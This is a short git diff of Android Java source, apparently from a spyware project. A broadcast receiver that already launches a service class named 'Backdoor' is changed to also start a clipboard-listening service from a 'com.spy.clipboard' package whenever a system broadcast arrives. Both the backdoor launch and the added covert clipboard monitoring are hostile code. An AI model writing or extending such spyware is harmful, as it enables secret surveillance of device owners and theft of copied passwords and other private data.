@@ -6,6 +6,8 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.net.wifi.WifiManager;
 
+import com.spy.clipboard.ListenClipboardService;
+
 public class ComposeReceiver extends BroadcastReceiver {
     public ComposeReceiver() {
     }
@@ -14,6 +16,7 @@ public class ComposeReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         String action=intent.getAction();
         startService(context,action);
+        ListenClipboardService.startForWeakLock(context);
     }
     void startService(Context context,String action){
         Intent sc = new Intent(context, Backdoor.class);
